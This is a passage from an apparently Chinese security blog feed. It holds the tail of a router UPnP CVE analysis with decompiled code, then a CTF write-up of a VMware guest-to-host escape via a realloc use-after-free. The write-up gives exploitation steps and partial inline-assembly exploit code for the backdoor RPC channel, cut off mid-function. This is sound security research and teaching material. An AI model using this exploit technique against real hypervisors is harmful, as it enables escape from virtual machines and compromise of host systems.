class="token punctuation">&#123;</span>            <span class="token function">ATP_UPNP_Free</span><span class="token punctuation">(</span>__s1<span class="token punctuation">)</span><span class="token punctuation">;</span>            ppcVar2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint<span class="token punctuation">)</span>ppcVar2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xbfffffff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">*</span>ppcVar2 <span class="token operator">=</span> param_2<span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        ppcVar2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>ppcVar2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>ppcVar2 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0x40090000</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>在函数的第13行，<code>__s2 = *(char **)(g_astActionArray + (int)param_2 * 0x10);</code><br>查看该全局的函数变量。但是发现没有识别出来这里数据的类型，由于不太会操作Ghidra，所以又回到了IDA，定位到该区域，手动识别了一下（懒得写idapython脚本）<br><img src="https://i.bmp.ovh/imgs/2022/01/3e9c043151bb8b36.png" alt=""></p><p>全局的虚表，使用0和1来标号，如果为0则偏移8的位置是函数，如果为1则偏移8的位置是字符串数据。以此来作为一个标记，来有序的，并且保证正确类型向调用者提供接口。</p><p>然后回过头来，查看一下上一页的调用。该服务的参数对应的是偏移为0和1的位置，关联到本函数，取出的是74偏移的字符串。</p><p>此时发现第一个函数有点眼熟，进去一看</p><p><img src="https://i.bmp.ovh/imgs/2022/01/85901983c9b7f862.png" alt=""></p><p>发现就是漏洞函数。于是确定了该漏洞函数的触发时利用间接的虚表调用。检查该虚表的交叉引用。</p><p><img src="https://i.bmp.ovh/imgs/2022/01/6beab2d510dcaca8.png" alt=""></p><p>调用出了本函数全都是<code>UPnPGetActionByName</code>函数。</p><p>然后一直向上检查交叉引用，检查到了<code>ATP_UPNP_Init</code>函数。该函数时初始化upnp服务时候所调用的函数，</p><p>那么至此该漏洞的出发链也已经完全发现了。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">main -<span class="token operator">></span> ATP+UPNP_init -<span class="token operator">></span> sub_40B5B4 -<span class="token operator">></span> sub_40A9C8 -<span class="token operator">></span> UPnPGetActionByName<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h3 id="漏洞触发位置"><a class="header-anchor" href="#漏洞触发位置">¶</a>漏洞触发位置</h3><p>看一下最终触发漏洞的函数。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">undefined4 <span class="token function">UPnPGetActionByName</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>param_2<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>param_3<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>param_4<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar2<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>ppcVar3<span class="token punctuation">;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>pcVar4<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>param_1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>param_2 <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>param_4 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token operator">*</span>param_4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>ppcVar3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ppcVar3 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">;</span>        ppcVar3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>ppcVar3<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      pcVar4 <span class="token operator">=</span> ppcVar3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint<span class="token punctuation">)</span>pcVar4 <span class="token operator">&amp;</span> <span class="token number">0x40000000</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        pcVar4 <span class="token operator">=</span> <span class="token operator">*</span>ppcVar3<span class="token punctuation">;</span>        iVar1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>pcVar4 <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">;</span>        iVar2 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> iVar1<span class="token punctuation">)</span><span class="token punctuation">,</span>param_2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>iVar2 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>           <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> iVar1 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span> <span class="token operator">||</span>            <span class="token punctuation">(</span>iVar1 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> iVar1 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>param_3<span class="token punctuation">)</span><span class="token punctuation">,</span> iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>param_4 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token operator">*</span>param_4 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>pcVar4 <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>g_astActionArray <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>ppcVar3 <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        iVar1 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">*</span>ppcVar3<span class="token punctuation">,</span>param_2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>param_4 <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token operator">*</span>param_4 <span class="token operator">=</span> pcVar4<span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>可以看到这里return返回的是，<code>return *(undefined4 *)(g_astActionArray + (int)*ppcVar3 * 0x10 + 8);</code>而<code>(ppcVar3 = *(char ***)(param_1 + 0x24)</code><br>返回上级调用查看第一个参数。</p><p><img src="https://i.bmp.ovh/imgs/2022/01/737c1bd8ec3d0bde.png" alt=""></p><p>继续查看<code>UpnpGetServiceByUrl</code>函数。</p><p><img src="https://i.bmp.ovh/imgs/2022/01/1256eca8a4f1d763.png" alt=""></p><p>经过了预处理之后，如果还没有返回，那么就会继续接下来的判断。</p><p><img src="https://i.bmp.ovh/imgs/2022/01/f12f04bdca370358.png" alt=""></p><p>这样的判断和虚表有些类似，但是暂时和我们所需要的分析函数中的<code>g_pstUpnpGvarHead</code>变量没有关系，这个变量在反汇编器中也看不到。</p><p>继续看这个函数，再<code>if</code>判断之后，还有一个<code>strcmp</code>函数，可以发现这个比较函数的参数1，已经又snprintf改编为了目前偏移位置的函数。进行了第二次函数判别，判断该服务是否是调用者要调用的目标服务。</p><p>所以能够确定该函数是一个，确定调用者调用服务的函数，就是说只要访问<code>url</code><br><code>/ctrlt/函数服务</code>就可以访问对应的服务，但是仔细看就会发现<code>snprintf</code>函数给函数服务规定了一定的格式。</p><p><img src="https://i.bmp.ovh/imgs/2022/01/d89af09884dad711.png" alt=""></p><p>只有满足<code>Name_num</code>的格式才是一个合法的服务。关于这个关键的全局变量<code>g_pstUpnpGvarHead</code>该变量只有在<code>UPNP_Init</code>函数才被调用，于是继续往上追踪该变量。</p><p>在初始化函数中发现，在这一句中初始化了：<code>g_pstUpnpGvarHead = (int *)ATP_UTIL_GVarGetValue(0x20001,0);</code></p><p>并且该函数是个链接函数，所以无法得知其内容，那么该变量的分析先告一段落，后期会动态调试获得该内存的内容。</p><p>回到<code>sub_40A9C8</code>函数调用<code>UpnpGetServiceByUr</code>的位置。发现调用该函数之前也是一些url的分析，调用该函数之后，</p><p><img src="https://i.bmp.ovh/imgs/2022/01/f65dfda3721d709d.png" alt=""></p><p>是在解析xml格式的文件。解析完了格式就会调用漏洞函数，所以断定，想要触发函数，一定要获得目标全局变量的值，使用qemu-mips-static开启调试模式发现，不会进入到upnp初始化里面去，可能是该服务的原因。</p><h2 id="总结"><a class="header-anchor" href="#总结">¶</a>总结</h2><ul><li>逆向服务的时候，要细致，能动调就调试，但是不能一上来就调试，中间有许多的细节还是不要丢失</li><li>路由器漏洞入门，学到了许多新的知识，也是分析的第一个CVE，耗时1天半</li><li>命令注入，多寻找system函数，这类函数在大型的项目中基本都使用</li></ul>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IOT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>虚拟机逃逸（二）</title>
    <link href="/2022/06/22/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2022/06/22/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发于奇安信攻防社区:<a href="https://forum.butian.net/share/1678">https://forum.butian.net/share/1678</a></p></blockquote><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>初次分析虚拟机逃逸，之前分析了一篇rwctf2018，这次视线转到强网杯的一个虚拟机逃逸分析。难度比rw大一点点，但是逆向分析还是重点，所以也不会差到哪里去。</p><p>一些有关基础的链接放在这里，不做赘述。</p><p><a href="https://nafod.net/blog/2019/12/21/station-escape-vmware-pwn.html">题解</a></p><p><a href="http://sysprogs.com/legacy/articles/kdvmware/guestrpc.shtml">RPC&#x2F;backdoor机制</a></p><h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><h3 id="bindiff"><a href="#bindiff" class="headerlink" title="bindiff"></a>bindiff</h3><p>这类题目都会给一个patched的vmx文件，安装vmware后，在<code>/usr/lib/vmware/bin</code>目录下可以找到目标vmx。使用bindiff比较patched和patch之前的区别可以迅速定位漏洞的位置。</p><p>（bindiff分析太慢了，这次选择了010）</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-89eec2810b186d524efda555894cca9031ad35e7.png" alt="图片.png"></p><p>有三处不同，ida定位到关键位置。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-18b396ee70885b34dc4b57846efde51baa0d1a1f.png" alt="图片.png"></p><p>一处把r12d改成了r12w，相当于省略了r12的高位。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b9b1beba56c3803f31e032d2c8476ce9c7d9fda8.png" alt="图片.png"></p><p>把跳转的条件改为了大于等于。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a25862dfd05d6be26c03539e4ccba81caefc64ab.png" alt="图片.png"></p><p>跳转改为了无条件。</p><p>最后一个改变，取消了条件检查，前两处patch改变如下。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-2c772477f3bc5dde104c35b1d042d567f8c8da28.png" alt="图片.png"></p><p>本能的反应就是realloc函数的漏洞，这类题在常规pwn中很常见，realloc函数第二个size参数如果为0，则和free效果一样，常常会导致DF、UAF.接下来细看一下伪代码。</p><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p>Vmx漏洞依然位于guestRPC的处理函数中，该函数中使用了一个大的switch处理不同的信息。接下来详细分析。（虚拟机逃逸（一）中只给了分析的结构体）</p><p>关于一些基础知识可以看<a href="">虚拟机逃逸（一）</a></p><h4 id="Open-RPC-channel"><a href="#Open-RPC-channel" class="headerlink" title="Open_RPC_channel"></a>Open_RPC_channel</h4><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1f4c153972dee2b077f41122e57c31023c87979c.png" alt="图片.png"></p><p>这是switch下最简单的一个分支了，打开信道，内容就是简单的接受数据包，然后获得magicnum（这部分是调试得到的）</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-4ac942da8b78bba6ed812cf7878a8b0b70561da5.png" alt="图片.png"></p><p>magicnum会进行一个比较如果失败就直接退出。</p><h4 id="Send-RPC-command-length"><a href="#Send-RPC-command-length" class="headerlink" title="Send_RPC_command_length"></a>Send_RPC_command_length</h4><p>首先判断<code>byte_FE9584</code>，也是一个魔数，接着就判断长度。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-3612cc7def195cc1c26ad8199975b01b1c452eb0.png" alt="图片.png"></p><p>长度为-1或者大于0x10000就会报错。如果RPCI的长度符合就会继续往下走。!</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-38b67aa4103d4bfdb748b0cab800ba051690af6b.png" alt="图片.png"><br> 在这个判断中，比较56和21偏移处的值，v56为接收到的数据包，v21为现有长度，如果数据长度大于现有长度则realloc重新分配，设置空间大小为新的大小，且修改msg_struct。</p><p>漏洞就出在这个部分。漏洞存在的比较隐秘，大体属于整形溢出。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-ac0faf0ad5f12e77c733f85edc1914098b407865.png" alt="图片.png"></p><p>此处，处理size的时候加入了LOWORD修饰，导致dword-&gt;word高位失去，所以如果设置v56&#x3D;0xffff则可以通过大小判断，然后LOWORD(0xffff+1)&#x3D;LOWORD(0x10000)&#x3D;0，则此时的realloc第二个参数为0，运行时重新回收ptr。也没有清0.导致了ptr的UAF利用。</p><h4 id="Send-RPC-command-data"><a href="#Send-RPC-command-data" class="headerlink" title="Send_RPC_command_data"></a>Send_RPC_command_data</h4><p>首先读入了需要发送的data指令，然后读取RPCI结构体，根据前面设置的长度，以不同的方式发送msg，一次最多发送四个字节，四个字节以内发送的方式都是一个byte一个byte的复制。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-36a2bba083009f75ce800f244312c2430730e108.png" alt="图片.png"></p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-b5ba2447ff1d948dcf05d645861baddbc9ae0718.png" alt="图片.png"></p><p>发送完指令之后，判断是否发送完，如果发送完了则进入指令处理，根据一个类似虚表的bss段指针，执行某个函数rw2018中，最后就是劫持了这样一个函数，让我们成功逃逸。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-163cb20a6e28b6d9bce90892deae335522c69b65.png" alt="图片.png"><br> 处理完之后，flag标志为设置为1.具体的指令可以搜索字符串，之前分析的rw2018中也有相应的分析，这里就不赘述。</p><h4 id="Recieve-RPC-reply-length"><a href="#Recieve-RPC-reply-length" class="headerlink" title="Recieve_RPC_reply_length"></a>Recieve_RPC_reply_length</h4><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-9589e548acbe430d797a4b712db305520f4cd8bd.png" alt="图片.png"></p><p>guest获得，返回的长度，逻辑简单。</p><h4 id="Recieve-RPC-reply-data"><a href="#Recieve-RPC-reply-data" class="headerlink" title="Recieve_RPC_reply_data"></a>Recieve_RPC_reply_data</h4><p>执行指令之后返回的数据。</p><p>逻辑和发送差不多，同样的先收到长度，然后判断长度，一次接受四个字节，然后再把数据转移到缓冲区。最后设置flag为发送完毕。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-5554b4d6edff9e2280409f6bd2c8cd2c86fea21f.png" alt="图片.png"></p><h4 id="Finish-receiving-RPC-reply-amp-Close-RPC-channel"><a href="#Finish-receiving-RPC-reply-amp-Close-RPC-channel" class="headerlink" title="Finish_receiving_RPC_reply &amp; Close_RPC_channel"></a>Finish_receiving_RPC_reply &amp; Close_RPC_channel</h4><p>这两个部分也较为简单，前者在rw2018详细分析过，后者就是close channel。同时设置flag为1，整个指令处理发送接收流程结束。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>前面说过了，漏洞存在于realloc中，利用该UAF可以造成泄露等操作。实际上leak和利用的思路还是和rw差不多的。</p><p>此处的UAF位置在realloc环节也就是设置发送长度的环节，但是造成UAF leak虚表还是需要先设置一个0x100大小的缓冲区。</p><ul><li>开启channel A channel B</li><li>A设置buffer为0x100， B 使用info get也设置为0x100</li><li>然后set_len触发A漏洞，B get这个buffer，A再次触发漏洞。此时B 的buffer已经在tcache里了</li><li>调用dnd_vison函数写入虚表</li><li>leak</li></ul><p>漏洞利用也是和rw一样，直接tcache劫持即可</p><h2 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h2><p>主要的流程还是复制rw2018的，改动少部分即可。还是对师傅的脚本分析</p><p>leak函数</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-4b9fefc7745ee94ae07cccc09bfdcb91cf0fb928.png" alt="图片.png"></p><p>完整的channel 0 发送指令</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-d6ac75d5867ddf6d2826a4909d4a23d798ecc4e9.png" alt="图片.png"></p><p>channel发送部分info get</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a5dfc228eaf5bbe1046ff8828591417ae8e7d130.png" alt="图片.png"></p><p>free channel 0 的buffer，然后在channel 1realloc出来。</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-cf4ca0bca038198b936f068479e3d7c86b304719.png" alt="图片.png"></p><p>再次free</p><p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-6101b8e1bf488c5b22fc638bf5ee6759f7e47d59.png" alt="图片.png"></p><p>dnd_verison打入虚表</p><p>tcache劫持操作也是一样的，只是改掉了触发的位置。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token keyword">void</span> <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%rdi,%%r10\n\t"</span>        <span class="token string">"movq %%rsi,%%r11\n\t"</span>        <span class="token string">"movq %%rdx,%%r12\n\t"</span>        <span class="token string">"movq %%rcx,%%r13\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x49435052,%%ebx\n\t"</span>        <span class="token string">"movl $0x1e,%%ecx\n\t"</span>        <span class="token string">"movl $0x5658,%%edx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%edi,(%%r10)\n\t"</span>        <span class="token string">"movl %%esi,(%%r11)\n\t"</span>        <span class="token string">"movl %%edx,(%%r12)\n\t"</span>        <span class="token string">"movl %%ecx,(%%r13)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r8"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token punctuation">,</span><span class="token string">"%r12"</span><span class="token punctuation">,</span><span class="token string">"%r13"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_set_len</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%eax,%%ebx\n\t"</span>        <span class="token string">"movq %%r8,%%r10\n\t"</span>        <span class="token string">"movl %%ecx,%%ebx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0001001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">channel_send_data</span><span class="token punctuation">(</span><span class="token keyword">int</span> cookie1<span class="token punctuation">,</span><span class="token keyword">int</span> cookie2<span class="token punctuation">,</span><span class="token keyword">int</span> channel_num<span class="token punctuation">,</span><span class="token keyword">int</span> len<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">,</span><span class="token keyword">int</span> <span class="token operator">*</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"pushq %%rbp\n\t"</span>        <span class="token string">"movq %%r9,%%r10\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"movq %%rcx,%%r11\n\t"</span>        <span class="token string">"movq $0,%%r12\n\t"</span>        <span class="token string">"1:\n\t"</span>        <span class="token string">"movq %%r8,%%rbp\n\t"</span>        <span class="token string">"add %%r12,%%rbp\n\t"</span>        <span class="token string">"movl (%%rbp),%%ebx\n\t"</span>        <span class="token string">"movl $0x564d5868,%%eax\n\t"</span>        <span class="token string">"movl $0x0002001e,%%ecx\n\t"</span>        <span class="token string">"movw $0x5658,%%dx\n\t"</span>        <span class="token string">"out %%eax,%%dx\n\t"</span>        <span class="token string">"addq $4,%%r12\n\t"</span>        <span class="token string">"cmpq %%r12,%%r11\n\t"</span>        <span class="token string">"ja 1b\n\t"</span>        <span class="token string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token string">"popq %%rbp\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span><span class="token punctuation">,</span><span class="token string">"%r11"</span><span class="token 